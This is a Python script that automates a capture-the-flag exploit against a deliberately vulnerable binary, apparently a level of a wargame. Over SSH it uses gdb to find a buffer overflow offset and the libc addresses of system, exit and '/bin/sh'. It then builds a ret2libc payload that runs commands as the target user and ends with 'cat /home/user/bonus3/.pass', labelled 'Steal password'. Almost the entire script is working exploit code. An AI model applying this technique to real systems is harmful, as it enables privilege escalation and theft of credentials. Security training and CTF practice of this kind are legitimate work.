import os
import sys

bool('Ressources' in os.getcwd()) if sys.path.append("../") else sys.path.append("../..")
from utils.ssh import exec, find_offset, get_func_address, get_func_structure, connect_by_previous
from utils.text import print_output, print_title
from utils.base import save_token, address_to_string, PATTERN

client = connect_by_previous()

files_list = exec(client, 'ls', title='Get files list')
print_output(files_list, 'Files')
print_title('Test this file')

binary_name = files_list[0]

exec(client, f'./{binary_name}', title='Simple execute binary')
print_title('Nothing happened')

exec(client, f'./{binary_name} test', title='Execute with one arg')
print_title('Nothing happened')

output = exec(client, f'./{binary_name} test test', title='Execute with two arg')
print_output(output, 'Output')
print_title('2+ arg and program print first of it')
print_title('Debug time')

func_info = exec(client, f'echo "info func" | gdb ./{binary_name} -q | egrep " greetuser$| main$"',
                 title='Get all functions')
print_output(func_info)
greet_address = get_func_address(client, 'greetuser')
main_address = get_func_address(client, 'main')
print_title(f'We have two entry points (main - {main_address}, greetuser - {greet_address})')

get_func_structure(client, 'main', title='')

offset = find_offset(client, pattern=f'{PATTERN} {PATTERN}', register='ebp', env='LANG=fi')

libc_addresses = exec(client, f'echo "r\ninfo proc map" | '
                              f'gdb ./{binary_name} -q -ex "b *main" | '
                              f'grep "libc" | awk \'{{print $1 " " $2}}\'',
                      title='Find system call with /bin/sh')[0].split(' ')
print_output(libc_addresses, 'Libc addresses')

shell_call_address = exec(
    client, f'echo "y" | gdb ./{binary_name} -q '
            f'-ex "b *main" '
            f'-ex "r" '
            f'-ex \'find {libc_addresses[0]}, {libc_addresses[1]}, "/bin/sh"\' '
            f'-ex "q" | head -n 6',
    title='Find system call with /bin/sh')[-1]
print_output(shell_call_address, 'Shell call address')

system_address = get_func_address(client, 'system', binary_name=f'{binary_name} -ex "b *main" -ex "r"')
print_output(system_address, 'System address')

exit_address = get_func_address(client, 'exit', binary_name=f'{binary_name} -ex "b *main" -ex "r"')
print_output(exit_address, 'Exit address')

print_title('Time to build our exploit!')
print_title('(Offset + 2) + system address + exit address + shell call address')

f = lambda command: f'echo "{command}" | LANG=fi ./{binary_name} ' \
                    f'{PATTERN} $(python -c \'print "." * {offset + 2} + ' \
                    f'"{address_to_string(system_address)}" + ' \
                    f'"{address_to_string(exit_address)}" + "{address_to_string(shell_call_address)}"\') | head -n 1'

output = exec(client, f('whoami'), title='Check user')
print_output(output, 'Current user')

token = exec(client, f('cat /home/user/bonus3/.pass'), title='Steal password')

save_token(token, client)
